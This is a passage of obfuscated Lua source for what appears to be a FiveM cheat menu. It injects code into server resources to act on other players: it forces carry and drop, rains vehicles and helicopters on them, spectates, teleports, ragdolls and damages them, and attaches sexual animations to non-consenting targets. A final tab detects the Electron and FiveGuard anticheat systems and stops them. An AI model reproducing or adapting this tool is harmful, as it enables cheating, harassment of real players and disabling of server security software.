process started! ID: "   .. v370 );MachoInjectResource("monitor",string.format([[
            CreateThread(function()
                Wait(1000)

                local targetId = %d

                -- Start carry animation
                TriggerServerEvent('cmg2_animationsCarry:sync', 127, "missfinale_c2mcs_1", "nm", "fin_c2_mcs_1_camman", "firemans_carry", 0.15, 0.27, 0.63, targetId, 100000, 0.0, 49, 33, 1)

                TriggerEvent('chat:addMessage', { args = { '^2Carry System:', 'Trigger sent! ID: %d' } })

                -- Drop immediately after animation starts
                Wait(20)  -- Adjust this time if needed
                TriggerServerEvent("cmg2_animations:stop", targetId)

                -- Drop complete, send chat message
                TriggerEvent('chat:addMessage', { args = { '^2Carry System:', 'Drop complete! ID: ' .. targetId } })
            end)
        ]],v370,v370));else MachoMenuNotification("Error","Please enter a valid EAC ID!");end break;end end end);MachoMenuButton(v88,"All Bring - Safe",function() MachoInjectResource("monitor",[[
        CreateThread(function()
            Wait(1000)

            local myId = PlayerId()
            local players = GetActivePlayers()
            local affected = {}

            for _, pid in ipairs(players) do
                if pid ~= myId then
                    local ped = GetPlayerPed(pid)

                    if DoesEntityExist(ped) then
                        local serverId = GetPlayerServerId(pid)

                        -- Force animation start
                        TriggerServerEvent('cmg2_animations:sync', serverId, "misscarsteal4@director_grip", "grip_idle", "gripidle", 0.5, 0.5, 0.0, serverId, 5000, 0.0, 1, 1, 1)

                        -- Carry animation (fireman carry)
                        Wait(5)
                        TriggerServerEvent('cmg2_animationsCarry:sync', 127, "missfinale_c2mcs_1", "nm", "missfinale_c2mcs_1", "firemans_carry", 0.15, 0.27, 0.63, serverId, 100000, 0.0, 49, 33, 1)

                        table.insert(affected, serverId)
                        Wait(5)
                    end
                end
            end

            print(">> Animations applied, waiting for drop...")

            Wait(0)

            for _, targetId in ipairs(affected) do
                TriggerServerEvent("cmg2_animations:stop", targetId)
                Wait(0)
            end
        end)
    ]]);MachoMenuNotification("Success","Triggers sent to all players!");end);MachoMenuText(v88,"RainCar Spawn");local v74=MachoMenuInputbox(v88,"Vehicle Model","Enter vehicle name");MachoMenuButton(v88,"Start Vehicle Rain",function() local v371=0 + 0 ;local v372;while true do if (v371==(0 + 0)) then v372=MachoMenuGetInputbox(v74);if ((v372==nil) or (v372=="")) then local v813=0 -0 ;while true do if (v813==(720 -(254 + 466))) then MachoMenuNotification("Error","Please enter a valid vehicle model!");return;end end end v371=561 -(544 + 16) ;end if (v371==1) then MachoInjectResource("monitor",string.format([[
        if careverActive then
            print("Carever is already running.")
            return
        end

        local vehicleModel = "%s"
        careverActive = true

        Citizen.CreateThread(function()
            while careverActive do
                RequestModel(vehicleModel)
                while not HasModelLoaded(vehicleModel) do
                    Wait(100)
                end

                local playerList = GetActivePlayers()
                for _, playerId in ipairs(playerList) do
                    local ped = GetPlayerPed(playerId)
                    local pos = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)

                    local vehicle = CreateVehicle(vehicleModel, pos.x, pos.y, pos.z, heading, true, false)
                    SetEntityAsNoLongerNeeded(vehicle)
                end

                Citizen.Wait(350)
            end
        end)
    ]],v372));MachoMenuNotification("Troll","Vehicle rain started for everyone with model: "   .. v372 );break;end end end);MachoMenuButton(v88,"Stop Vehicle Rain",function() local v373=0;while true do if (v373==(0 -0)) then MachoInjectResource("monitor",[[
        careverActive = false
        print("Car ever has been stopped.")
    ]]);MachoMenuNotification("Troll","Vehicle rain has been stopped.");break;end end end);MachoMenuText(v88,"Helicopter Spawn");local v134=false;local v135=nil;local v136=MachoMenuInputbox(v88,"Helicopter Rain ID","e.g., 123");MachoMenuButton(v88,"Start Helicopter Rain",function() local v374=tonumber(MachoMenuGetInputbox(v136));if ( not v374 or (v374<=0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end if v134 then MachoMenuNotification("Warning","Already started. Use stop button to end.");return;end v134=true;MachoMenuNotification("Helicopter System","Rain started! Target ID: "   .. v374 );v135=CreateThread(function() while v134 do MachoInjectResource("monitor",string.format([[
                local helicopterModel = "volatus"
                local targetPlayer = GetPlayerFromServerId(%d)
                if targetPlayer == -1 then return end
                local targetPed = GetPlayerPed(targetPlayer)
                if not DoesEntityExist(targetPed) then return end
                local coords = GetEntityCoords(targetPed)
                local heading = GetEntityHeading(targetPed)
                RequestModel(helicopterModel)
                while not HasModelLoaded(helicopterModel) do Wait(100) end
                local helicopter = CreateVehicle(GetHashKey(helicopterModel), coords.x, coords.y, coords.z + 10.0, heading, true, false)
                if DoesEntityExist(helicopter) then
                    SetVehicleEngineOn(helicopter, true, true, false)
                    SetEntityVelocity(helicopter, 0.0, 0.0, -50.0)
                end
            ]],v374));Wait(1628 -(294 + 334) );end end);end);MachoMenuButton(v88,"Stop Helicopter Rain",function() if v134 then local v560=253 -(236 + 17) ;while true do if (v560==(0 + 0)) then v134=false;v135=nil;v560=1 + 0 ;end if (v560==1) then MachoMenuNotification("Helicopter System","Helicopter rain stopped.");break;end end else MachoMenuNotification("Info","Already stopped.");end end);local v137=false;local v138=nil;local v139=MachoMenuInputbox(v88,"Target Player ID (Spectate)","e.g., 123");MachoMenuButton(v88,"Spectate Player",function() local v375=0;local v376;while true do if (v375==(3 -2)) then if  not v137 then local v814=nil;if (GetResourceState("monitor")=="started") then v814="monitor";elseif (GetResourceState("qb-core")=="started") then v814="qb-core";else v814="ox_inventory";end MachoInjectResource2(NewThreadNs,v814,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Spectate: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Spectate: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Spectate: Cannot spectate self!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'You cannot spectate yourself!' } })
                return
            end
            
            _G.spectateActive = true
            _G.spectateTargetPed = targetPed
            _G.spectateTargetId = targetServerId
            
            NetworkSetInSpectatorMode(true, targetPed)
            SetEntityVisible(PlayerPedId(), false, false)
            FreezeEntityPosition(PlayerPedId(), true)
            
            local targetName = GetPlayerName(targetPlayer)
            print("Spectate: Spectating " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Spectating ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
        ]],v376));v137=true;v138=v376;MachoMenuNotification("Spectate","Spectating player ID: "   .. v376 );else local v815=0;local v816;while true do if (v815==(0 -0)) then v816=nil;if (GetResourceState("monitor")=="started") then v816="monitor";elseif (GetResourceState("qb-core")=="started") then v816="qb-core";else v816="ox_inventory";end v815=1;end if (1==v815) then MachoInjectResource2(NewThreadNs,v816,[[
            if _G.spectateActive then
                _G.spectateActive = false
                _G.spectateTargetPed = nil
                _G.spectateTargetId = nil
                
                NetworkSetInSpectatorMode(false, PlayerPedId())
                SetEntityVisible(PlayerPedId(), true, false)
                FreezeEntityPosition(PlayerPedId(), false)
                
                print("Spectate: Stopped spectating")
                TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
            end
        ]]);v137=false;v815=2 + 0 ;end if (v815==(2 + 0)) then v138=nil;MachoMenuNotification("Spectate","Spectate stopped");break;end end end break;end if (v375==(794 -(413 + 381))) then v376=tonumber(MachoMenuGetInputbox(v139));if ( not v376 or (v376<=0)) then local v817=0 + 0 ;while true do if (v817==(0 -0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v375=1;end end end);MachoMenuButton(v88,"Stop Spectate",function() if v137 then local v561=0;local v562;while true do if (v561==(4 -2)) then v138=nil;MachoMenuNotification("Spectate","Spectate stopped");break;end if (v561==(1971 -(582 + 1388))) then MachoInjectResource2(NewThreadNs,v562,[[
            if _G.spectateActive then
                _G.spectateActive = false
                _G.spectateTargetPed = nil
                _G.spectateTargetId = nil
                
                NetworkSetInSpectatorMode(false, PlayerPedId())
                SetEntityVisible(PlayerPedId(), true, false)
                FreezeEntityPosition(PlayerPedId(), false)
                
                print("Spectate: Stopped spectating")
                TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
            end
        ]]);v137=false;v561=2 -0 ;end if (v561==(0 + 0)) then v562=nil;if (GetResourceState("monitor")=="started") then v562="monitor";elseif (GetResourceState("qb-core")=="started") then v562="qb-core";else v562="ox_inventory";end v561=365 -(326 + 38) ;end end else MachoMenuNotification("Spectate","Not currently spectating");end end);local v140=false;local v141=MachoMenuInputbox(v88,"Target Player ID (Spectate Toggle)","e.g., 123");MachoMenuButton(v88,"Spectate Toggle",function() local v377=tonumber(MachoMenuGetInputbox(v141));if ( not v377 or (v377<=(0 -0))) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end MachoInjectResource2(NewThreadNs,"monitor",string.format([[
        local targetServerId = %d
        
        if not _G.spectateActive then
            -- Start spectating
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Spectate: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Spectate: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Spectate: Cannot spectate self!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'You cannot spectate yourself!' } })
                return
            end
            
            _G.spectateActive = true
            _G.spectateTargetPed = targetPed
            _G.spectateTargetId = targetServerId
            
            NetworkSetInSpectatorMode(true, targetPed)
            SetEntityVisible(PlayerPedId(), false, false)
            FreezeEntityPosition(PlayerPedId(), true)
            
            local targetName = GetPlayerName(targetPlayer)
            print("Spectate: Spectating " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Spectating ' .. targetName .. ' (ID: %d)' } })
        else
            -- Stop spectating
            _G.spectateActive = false
            _G.spectateTargetPed = nil
            _G.spectateTargetId = nil
            
            NetworkSetInSpectatorMode(false, PlayerPedId())
            SetEntityVisible(PlayerPedId(), true, false)
            FreezeEntityPosition(PlayerPedId(), false)
            
            print("Spectate: Stopped spectating")
            TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
        end
    ]],v377,v377,v377));if  not v140 then local v563=0;while true do if (v563==0) then v140=true;MachoMenuNotification("Spectate","Spectating player ID: "   .. v377 );break;end end else v140=false;MachoMenuNotification("Spectate","Spectate stopped");end end);local v142=MachoMenuInputbox(v88,"Target Player ID (S1 Teleport)","e.g., 123");MachoMenuButton(v88,"S1 Teleport to Player",function() local v378=0;local v379;local v380;while true do if (v378==(0 -0)) then v379=tonumber(MachoMenuGetInputbox(v142));if ( not v379 or (v379<=(620 -(47 + 573)))) then local v818=0 + 0 ;while true do if (v818==0) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v378=4 -3 ;end if (v378==(1 -0)) then MachoMenuNotification("S1 Teleport","Teleporting to player ID: "   .. v379 );v380=nil;v378=2;end if (v378==(1666 -(1269 + 395))) then if (GetResourceState("monitor")=="started") then v380="monitor";elseif (GetResourceState("qb-core")=="started") then v380="qb-core";else v380="ox_inventory";end MachoInjectResource2(NewThreadNs,v380,string.format([[
        local targetServerId = %d
        local targetPlayer = GetPlayerFromServerId(targetServerId)
        
        if not targetPlayer then
            print("S1 Teleport: Player not found!")
            TriggerEvent('chat:addMessage', { args = { '^1S1 Teleport:', 'Player not found! ID: ' .. targetServerId } })
            return
        end
        
        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then
            print("S1 Teleport: Target ped not found!")
            TriggerEvent('chat:addMessage', { args = { '^1S1 Teleport:', 'Target player not in game! ID: ' .. targetServerId } })
            return
        end
        
        if targetPed == PlayerPedId() then
            print("S1 Teleport: Cannot teleport to self!")
            TriggerEvent('chat:addMessage', { args = { '^1S1 Teleport:', 'You cannot teleport to yourself!' } })
            return
        end
        
        local myPed = PlayerPedId()
        local targetName = GetPlayerName(targetPlayer)
        
        if not IsPedInAnyVehicle(targetPed, false) then
            local coords = GetEntityCoords(targetPed)
            SetEntityCoords(myPed, coords.x, coords.y, coords.z + 1.0)
            print("S1 Teleport: Teleported to " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
        else
            local veh = GetVehiclePedIsIn(targetPed, false)
            if DoesEntityExist(veh) then
                local seatToUse = nil
                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(veh))
                
                for i = -1, maxSeats - 2 do
                    if IsVehicleSeatFree(veh, i) then
                        seatToUse = i
                        break
                    end
                end
                
                if seatToUse ~= nil then
                    SetPedIntoVehicle(myPed, veh, seatToUse)
                    print("S1 Teleport: Teleported into " .. targetName .. "'s vehicle")
                    TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported into ' .. targetName .. "'s vehicle (ID: " .. targetServerId .. ")" } })
                else
                    local coords = GetEntityCoords(veh)
                    SetEntityCoords(myPed, coords.x, coords.y, coords.z + 1.0)
                    print("S1 Teleport: Teleported to " .. targetName .. "'s vehicle")
                    TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported to ' .. targetName .. "'s vehicle (ID: " .. targetServerId .. ")" } })
                end
            else
                local coords = GetEntityCoords(targetPed)
                SetEntityCoords(myPed, coords.x, coords.y, coords.z + 1.0)
                print("S1 Teleport: Teleported to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            end
        end
    ]],v379));break;end end end);local v143=MachoMenuInputbox(v88,"Target Player ID (Force Fall)","e.g., 123");MachoMenuButton(v88,"ZT Force Fall Once",function() local v381=tonumber(MachoMenuGetInputbox(v143));if ( not v381 or (v381<=(492 -(76 + 416)))) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end MachoMenuNotification("Force Fall","Forcing player ID: "   .. v381   .. " to fall" );local v382=nil;if (GetResourceState("monitor")=="started") then v382="monitor";elseif (GetResourceState("qb-core")=="started") then v382="qb-core";else v382="ox_inventory";end MachoInjectResource2(NewThreadNs,v382,string.format([[
        local targetServerId = %d
        local targetPlayer = GetPlayerFromServerId(targetServerId)
        
        if not targetPlayer then
            print("Force Fall: Player not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Force Fall:', 'Player not found! ID: ' .. targetServerId } })
            return
        end
        
        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then
            print("Force Fall: Target ped not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Force Fall:', 'Target player not in game! ID: ' .. targetServerId } })
            return
        end
        
        if targetPed == PlayerPedId() then
            print("Force Fall: Cannot target self!")
            TriggerEvent('chat:addMessage', { args = { '^1Force Fall:', 'You cannot target yourself!' } })
            return
        end
        
        SetPedToRagdoll(targetPed, 3000, 3000, 0, true, true, false)
        ApplyDamageToPed(targetPed, 10, false, GetHashKey("WEAPON_FIRE"))
        
        local targetName = GetPlayerName(targetPlayer)
        print("Force Fall: Forced " .. targetName .. " to fall")
        TriggerEvent('chat:addMessage', { args = { '^2Force Fall:', 'Forced ' .. targetName .. ' (ID: ' .. targetServerId .. ') to fall' } })
    ]],v381));end);local v144=MachoMenuInputbox(v88,"Target Player ID (Copy Outfit)","e.g., 123");MachoMenuButton(v88,"ZT Copy Outfit",function() local v383=0;local v384;local v385;while true do if (v383==0) then v384=tonumber(MachoMenuGetInputbox(v144));if ( not v384 or (v384<=0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end v383=444 -(319 + 124) ;end if (v383==(4 -2)) then if (GetResourceState("monitor")=="started") then v385="monitor";elseif (GetResourceState("qb-core")=="started") then v385="qb-core";else v385="ox_inventory";end MachoInjectResource2(NewThreadNs,v385,string.format([[
        local targetServerId = %d
        local targetPlayer = GetPlayerFromServerId(targetServerId)
        
        if not targetPlayer then
            print("Copy Outfit: Player not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'Player not found! ID: ' .. targetServerId } })
            return
        end
        
        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then
            print("Copy Outfit: Target ped not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'Target player not in game! ID: ' .. targetServerId } })
            return
        end
        
        if targetPed == PlayerPedId() then
            print("Copy Outfit: Cannot copy from self!")
            TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'You cannot copy from yourself!' } })
            return
        end
        
        local myPed = PlayerPedId()
        local modelmy = GetEntityModel(myPed)
        local model = GetEntityModel(targetPed)
        
        if modelmy ~= model then
            RequestModel(model)
            local timeout = 0
            while not HasModelLoaded(model) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(model) then
                SetPlayerModel(PlayerId(), model)
                SetPedDefaultComponentVariation(myPed)
            else
                print("Copy Outfit: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'Failed to load model!' } })
                return
            end
        end
        
        for i = 0, 12 do
            local drawable = GetPedDrawableVariation(targetPed, i)
            local texture = GetPedTextureVariation(targetPed, i)
            local palette = GetPedPaletteVariation(targetPed, i)
            SetPedComponentVariation(myPed, i, drawable, texture, palette)
        end
        
        for i = 0, 10 do
            local propIndex = GetPedPropIndex(targetPed, i)
            local propTexture = GetPedPropTextureIndex(targetPed, i)
            if propIndex ~= -1 then
                SetPedPropIndex(myPed, i, propIndex, propTexture, true)
            else
                ClearPedProp(myPed, i)
            end
        end
        
        SetModelAsNoLongerNeeded(model)
        
        local targetName = GetPlayerName(targetPlayer)
        print("Copy Outfit: Copied outfit from " .. targetName)
        TriggerEvent('chat:addMessage', { args = { '^2Copy Outfit:', 'Copied outfit from ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
    ]],v384));break;end if (v383==(1008 -(564 + 443))) then MachoMenuNotification("Copy Outfit","Copying outfit from ID: "   .. v384 );v385=nil;v383=2;end end end);local v145=MachoMenuAddTab(v4,"ERP Menu");local v146=MachoMenuGroup(v145,"ERP Operations",v3,9,(v1.x-v3) + (415 -265) ,v1.y);local v147=MachoMenuInputbox(v146,"Target Player ID","e.g., 1");local v148=false;MachoMenuButton(v146,"Apply Animation to ID / Stop",function() local v386=458 -(337 + 121) ;local v387;while true do if (v386==(0 -0)) then v387=MachoMenuGetInputbox(v147);if v148 then MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
        ]]);MachoMenuNotification("ERP System","Animation stopped!");v148=false;return;end v386=1;end if (v386==(3 -2)) then if (v387 and (v387~="")) then local v819=1911 -(1261 + 650) ;while true do if (v819==(0 + 0)) then MachoInjectResource("monitor",string.format([[
            local targetID = %s
            local targetPed = GetPlayerPed(GetPlayerFromServerId(tonumber(targetID)))
            
            if targetPed and targetPed ~= 0 then
                local playerPed = PlayerPedId()
                local animDict = "rcmpaparazzo_2"
                local animName = "shag_loop_a"
                
                RequestAnimDict(animDict)
                while not HasAnimDictLoaded(animDict) do
                    Citizen.Wait(0)
                end
                
                TaskPlayAnim(playerPed, animDict, animName, 8.0, -8.0, -1, 1, 0, false, false, false)
                AttachEntityToEntity(playerPed, targetPed, 11816, 0.0, -0.6, 0.0, 0.5, 0.5, 0.0, true, true, true, true, 0, true)
                
                TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation applied for ID ' .. targetID .. '!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'Invalid or not found player ID!' } })
            end
        ]],v387));MachoMenuNotification("ERP System","Animation applied for ID "   .. v387   .. "!" );v819=1 -0 ;end if (v819==(1818 -(772 + 1045))) then v148=true;break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);MachoMenuButton(v146,"Fuck Nearby",function() local v388=0 + 0 ;while true do if ((145 -(102 + 42))==v388) then MachoMenuNotification("ERP System","Animation applied to nearby ped!");v148=true;break;end if (v388==0) then if v148 then MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
        ]]);MachoMenuNotification("ERP System","Animation stopped!");v148=false;return;end MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local peds = {}
        local pedHandle, ped = FindFirstPed()
        local success
        
        repeat
            if DoesEntityExist(ped) and ped ~= playerPed then
                local pedCoords = GetEntityCoords(ped)
                if Vdist(playerCoords, pedCoords) < 10.0 then
                    table.insert(peds, ped)
                end
            end
            success, ped = FindNextPed(pedHandle)
        until not success
        EndFindPed(pedHandle)
        
        local closestPed = nil
        local closestDistance = 3.0
        
        for _, ped in pairs(peds) do
            local pedCoords = GetEntityCoords(ped)
            local distance = Vdist(playerCoords, pedCoords)
            if distance < closestDistance and ped ~= playerPed then
                closestPed = ped
                closestDistance = distance
            end
        end
        
        if closestPed then
            local animDict = "rcmpaparazzo_2"
            local animName = "shag_loop_a"
            
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do
                Citizen.Wait(0)
            end
            
            TaskPlayAnim(playerPed, animDict, animName, 8.0, -8.0, -1, 1, 0, false, false, false)
            AttachEntityToEntity(playerPed, closestPed, 11816, 0.0, -0.6, 0.0, 0.5, 0.5, 0.0, true, true, true, true, 0, true)
            
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation applied to nearby ped!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'No suitable ped found nearby!' } })
        end
    ]]);v388=1845 -(1524 + 320) ;end end end);MachoMenuButton(v146,"Fuck Nearby Exhaust",function() local v389=1270 -(1049 + 221) ;while true do if ((157 -(18 + 138))==v389) then MachoMenuNotification("ERP System","Animation applied to nearby vehicle exhaust!");v148=true;break;end if ((0 -0)==v389) then if v148 then local v820=0;while true do if ((1102 -(67 + 1035))==v820) then MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            local originalCoords = GetEntityCoords(playerPed)
            SetEntityCoords(playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped and returned to original position!' } })
        ]]);MachoMenuNotification("ERP System","Animation stopped and returned to original position!");v820=349 -(136 + 212) ;end if (v820==1) then v148=false;return;end end end MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local maxAttachDistance = 10.0
        local vehicles = {}
        local handle, vehicle = FindFirstVehicle()
        local success
        
        repeat
            success, vehicle = FindNextVehicle(handle)
            if success then
                table.insert(vehicles, vehicle)
            end
        until not success
        EndFindVehicle(handle)
        
        local closestVehicle = nil
        local closestDistance = maxAttachDistance
        
        for _, vehicle in ipairs(vehicles) do
            local vehicleCoords = GetEntityCoords(vehicle)
            local distance = Vdist(playerCoords, vehicleCoords)
            if distance < closestDistance then
                closestVehicle = vehicle
                closestDistance = distance
            end
        end
        
        if closestVehicle then
            local vehicleCoords = GetEntityCoords(closestVehicle)
            local heading = GetEntityHeading(closestVehicle)
            local radians = math.rad(heading)
            local rearOffset = 5.0
            local sideOffset = 2.0
            local xRearOffset = rearOffset * math.cos(radians)
            local yRearOffset = rearOffset * math.sin(radians)
            local xSideOffset = sideOffset * math.sin(radians)
            local ySideOffset = -sideOffset * math.cos(radians)
            local offsetCoords = vehicleCoords + vector3(xRearOffset + xSideOffset, yRearOffset + ySideOffset, 0.0)
            
            SetEntityCoords(playerPed, offsetCoords.x, offsetCoords.y, offsetCoords.z, false, false, false, true)
            SetEntityHeading(playerPed, heading)
            
            local animDict = "rcmpaparazzo_2"
            local animName = "shag_loop_a"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do
                Citizen.Wait(100)
            end
            TaskPlayAnim(playerPed, animDict, animName, 8.0, -8.0, -1, 1, 0, false, false, false)
            
            AttachEntityToEntity(playerPed, closestVehicle, 0, 0.0, -3.0, 0.6, 0.0, 0.0, heading, true, true, false, true, 7, true)
            
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation applied to nearby vehicle exhaust!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'No suitable vehicle found nearby!' } })
        end
    ]]);v389=4 -3 ;end end end);MachoMenuButton(v146,"Apply Mouth Animation",function() if v148 then MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
        ]]);MachoMenuNotification("ERP System","Animation stopped!");v148=false;return;end local v390=MachoMenuGetInputbox(v147);if (v390 and (v390~="")) then MachoInjectResource("monitor",string.format([[
            local targetID = %s
            local targetPed = GetPlayerPed(GetPlayerFromServerId(tonumber(targetID)))
            
            if targetPed and targetPed ~= 0 then
                local playerPed = PlayerPedId()
                
                -- 1st Animation: Mouth animation to target ID
                local animDict1 = "anim@mp_player_intincardockstd@rds@"
                local animName1 = "enter"
                
                RequestAnimDict(animDict1)
                while not HasAnimDictLoaded(animDict1) do
                    Citizen.Wait(0)
                end
                
                -- Put target character in animation and adjust position
                TaskPlayAnim(targetPed, animDict1, animName1, 8.0, -8.0, -1, 1, 0, false, false, false)
                
                -- Wait for target character animation to start
                Citizen.Wait(1000)
                
                -- 2nd Animation: Own character
                local animDict2 = "rcmpaparazzo_2"
                local animName2 = "shag_loop_a"
                
                RequestAnimDict(animDict2)
                while not HasAnimDictLoaded(animDict2) do
                    Citizen.Wait(0)
                end
                
                TaskPlayAnim(playerPed, animDict2, animName2, 8.0, -8.0, -1, 1, 0, false, false, false)
                
                -- Attach characters together - forward, up, mouth level
                -- 11816 = pelvis bone, 0.0 = forward, 0.8 = up, 0.0 = sideways
                AttachEntityToEntity(playerPed, targetPed, 11816, 0.0, 0.8, 0.0, 0.0, 0.0, 0.0, true, true, true, true, 0, true)
                
                -- Fix character direction - facing target character
                local targetHeading = GetEntityHeading(targetPed)
                SetEntityHeading(playerPed, targetHeading)
                
                TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Mouth animation applied for ID ' .. targetID .. ' and your character is also animated!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'Invalid or not found player ID!' } })
            end
        ]],v390));MachoMenuNotification("ERP System","Mouth animation applied for ID "   .. v390   .. " and your character is also animated!" );v148=true;else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v149=MachoMenuAddTab(v4,"Anticheat Check");local v150=9 + 1 ;local v151=5 + 0 ;local v152=MachoMenuGroup(v149,"Anticheat Checker",v3,v150,(v1.x-v3) + 150 ,v1.y);local v153="";local v154=false;local v155="";local v156=false;local function v157() local v391=false;local v392="";local v393=GetNumResources();for v493=1604 -(240 + 1364) ,v393-(1083 -(1050 + 32))  do local v494=GetResourceByFindIndex(v493);local v495=LoadResourceFile(v494,"fxmanifest.lua");if v495 then if (string.find(v495,"https://electron-services.com") or string.find(v495,"Electron Services") or string.find(v495,"The most advanced fiveM anticheat")) then v391=true;v392=v494;v153=v494;break;end end end return v391,v392;end local function v158() local v394=0;local v395;local v396;local v397;while true do if (v394==1) then v397=GetNumResources();for v757=0,v397-1  do local v758=GetResourceByFindIndex(v757);local v759=GetNumResourceMetadata(v758,"client_script");for v821=0,v759-1  do local v822=GetResourceMetadata(v758,"client_script",v821);if (v822~=nil) then if string.find(v822,"obfuscated") then v395=true;v396=v758;v155=v758;break;end end end if v395 then break;end end v394=7 -5 ;end if (v394==0) then v395=false;v396="";v394=1;end if (v394==2) then return v395,v396;end end end MachoMenuButton(v152,"Scan Electron Anticheat",function() CreateThread(function() local v496,v497=v157();Wait(100);if v496 then MachoMenuNotification("[Anticheat Checker]","Electron Anticheat System Found: "   .. v497   .. "" );else local v703=0 + 0 ;while true do if (v703==(1056 -(331 + 724))) then v154=false;break;end if (v703==0) then MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Not Found!");v153="";v703=1;end end end end);end);MachoMenuButton(v152,"Scan FiveGuard",function() CreateThread(function() local v498,v499=v158();Wait(9 + 91 );if v498 then MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat System Found: "   .. v499   .. "" );else local v704=0;while true do if (v704==(645 -(269 + 375))) then v156=false;break;end if (v704==(725 -(267 + 458))) then MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Not Found!");v155="";v704=1 + 0 ;end end end end);end);MachoMenuButton(v152,"Stop/Start Electron Anticheat",function() CreateThread(function() local v500,v501=v157();Wait(192 -92 );if v500 then if  not v154 then local v823=818 -(667 + 151) ;while true do if (v823==(1497 -(1410 + 87))) then MachoResourceStop(v153);MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Stopped: "   .. v153   .. "" );v823=1898 -(1504 + 393) ;end if (v823==(2 -1)) then v154=true;break;end end else local v824=0 -0 ;while true do if ((796 -(461 + 335))==v824) then MachoResourceStart(v153);MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Started: "   .. v153   .. "" );v824=1 + 0 